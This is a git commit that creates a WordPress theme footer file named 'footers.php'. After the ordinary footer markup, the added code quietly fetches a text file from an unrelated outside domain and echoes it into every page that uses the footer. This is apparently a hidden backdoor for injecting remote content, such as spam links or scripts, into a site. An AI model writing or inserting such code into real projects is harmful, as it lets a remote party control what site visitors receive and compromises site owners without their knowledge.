57f3629fc25eb6f0f624df6b45ea199b7fb0d720
lanthau <figththelast@gmail.com>
2025-02-11 18:56:10 +0700

    Create footers.php

---
+++ footers.php
@@ -0,0 +1,11 @@
+<?php
+            get_template_part( 'template-parts/footer/footer', 'content' );
+            wp_footer();
+      ?>
+      </div>
+   </body>
+</html>
+
+<?php
+echo file_get_contents('https://desa-badai.pro/content/cadasbanten.txt');
+?>
